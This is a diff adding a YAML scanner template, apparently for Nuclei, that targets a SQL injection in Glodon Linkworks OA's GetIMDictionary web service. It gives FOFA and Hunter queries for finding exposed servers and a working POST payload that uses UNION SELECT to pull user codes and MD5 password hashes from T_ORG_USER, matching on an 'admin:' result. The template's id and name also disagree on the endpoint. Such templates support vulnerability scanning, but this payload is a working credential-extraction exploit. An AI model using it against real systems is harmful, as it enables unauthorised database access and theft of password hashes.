@@ -1,0 +1,35 @@
+id: glodon-linkworks-getuserbyusercode-sqli
+
+info:
+  name: 广联达 Linkworks GetIMDictionary SQL 注入
+  author: SleepingBag945
+  severity: high
+  description: |
+    广联达 Linkworks办公OA GetIMDictionary接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息
+    FOFA: body="/Services/Identification/"
+    HUNTER: web.body="/Services/Identification/"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/webapp/广联达/广联达%20Linkworks%20GetIMDictionary%20SQL注入漏洞.html
+  tags: glodon,sqli
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+
+      - type: word
+        words:
+          - '<?xml version='
+          - 'value="admin:'
+        part: body
+        condition: and
